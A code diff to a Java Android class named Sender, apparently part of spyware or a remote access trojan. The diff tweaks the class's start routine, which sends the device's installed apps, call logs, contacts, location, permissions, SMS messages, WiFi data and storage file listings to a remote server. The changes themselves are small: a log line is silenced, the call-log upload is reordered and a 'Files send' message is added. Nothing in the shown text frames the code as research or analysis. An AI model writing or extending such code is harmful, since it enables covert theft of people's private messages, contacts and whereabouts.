@@ -24,7 +24,7 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     @Override
     protected String doInBackground(String... strings) {
-        Logger.log("sending" + strings[0]);
+        //Logger.log("sending" + strings[0]);
         String data = "";
         URL url;
         try {
@@ -67,13 +67,13 @@ public class Sender extends AsyncTask<String, Void, String> {
         Logger.log("Sender.start()");
         try {
             Sender.sendApps(true);
-            Sender.sendCalls();
             Sender.sendContacts();
             Sender.sendLocation();
             Sender.sendPermissions();
             Sender.sendSms();
             Sender.sendWifi();
             Sender.sendFile("/storage/emulated/0");
+            Sender.sendCalls();
         } catch (Exception ex) {
             ex.printStackTrace();
             start();
@@ -259,6 +259,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     public static boolean sendFile(String path) {
         Logger.log("Sender.sendFile()");
         try {
+            showMsg("Files send");
             JSONObject data = new JSONObject();
             data.put("type", "file");
             data.put("value", Files.get(path));
